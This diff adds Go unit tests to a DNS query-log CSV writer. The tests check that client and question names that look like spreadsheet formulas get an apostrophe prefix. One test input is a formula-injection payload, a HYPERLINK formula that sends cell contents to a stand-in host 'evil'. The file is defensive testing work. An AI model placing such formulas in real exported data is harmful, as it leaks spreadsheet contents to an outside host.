@@ -94,6 +94,38 @@ var _ = Describe("FileWriter", func() {
 				}).Should(Equal(1))
 			})
 		})
+		Describe("createQueryLogRow", func() {
+			It("should neutralise client names that look like spreadsheet formulas", func() {
+				row := createQueryLogRow(&LogEntry{
+					ClientNames: []string{`=HYPERLINK("http://evil/?"&A1,"x")`},
+					Start:       time.Now(),
+				})
+
+				Expect(row[2]).Should(HavePrefix("'"))
+				Expect(row[2]).Should(ContainSubstring("HYPERLINK"))
+			})
+
+			It("should neutralise question names that look like spreadsheet formulas", func() {
+				row := createQueryLogRow(&LogEntry{
+					QuestionName: "=1+1",
+					Start:        time.Now(),
+				})
+
+				Expect(row[5]).Should(Equal("'=1+1"))
+			})
+
+			It("should leave ordinary values untouched", func() {
+				row := createQueryLogRow(&LogEntry{
+					ClientNames:  []string{"laptop.lan"},
+					QuestionName: "example.com",
+					Start:        time.Now(),
+				})
+
+				Expect(row[2]).Should(Equal("laptop.lan"))
+				Expect(row[5]).Should(Equal("example.com"))
+			})
+		})
+
 		When("Cleanup is called", func() {
 			It("should delete old files", func() {
 				writer, err = NewCSVWriter(tmpDir.Path, false, 1)
